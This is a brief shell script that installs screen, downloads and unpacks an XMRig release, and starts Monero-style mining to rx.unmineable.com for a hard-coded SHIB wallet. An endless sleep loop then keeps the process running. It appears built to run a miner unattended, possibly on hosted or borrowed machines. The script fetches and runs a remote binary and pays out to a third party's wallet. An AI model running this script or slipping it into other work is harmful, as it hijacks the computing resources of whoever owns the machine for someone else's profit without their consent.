#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
./xmrig -o rx.unmineable.com:3333 -u SHIB:0x7363a42d5cf63764e3aad02b8eda5d9ba13f69be.anas -p X -k -a rx/0
while [ 1 ]; do
sleep 3
done
sleep 999
